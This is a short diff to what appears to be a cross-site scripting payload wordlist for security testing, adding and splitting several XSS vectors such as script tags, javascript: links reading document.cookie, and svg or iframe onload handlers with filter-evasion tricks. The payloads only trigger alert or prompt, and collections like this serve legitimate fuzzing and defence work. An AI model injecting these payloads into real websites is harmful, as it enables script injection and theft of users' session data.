@@ -100,9 +100,10 @@ http://www.google<script .com>alert(document.location)</script
 <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
 <img src="/" =_=" title="onerror='prompt(1)'">
 <%<!--'%><script>alert(1);</script -->
-<script src="data:text/javascript,alert(1)"></script>
+<script src="data:text/javascript,alert(1)
 <iframe/src \/\/onload = prompt(1)
 <iframe/onreadystatechange=alert(1)
+"></script><svg/onload=alert(1)>
 <svg/onload=alert(1)
 <input value=<><iframe/src=javascript:confirm(1)
 <input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
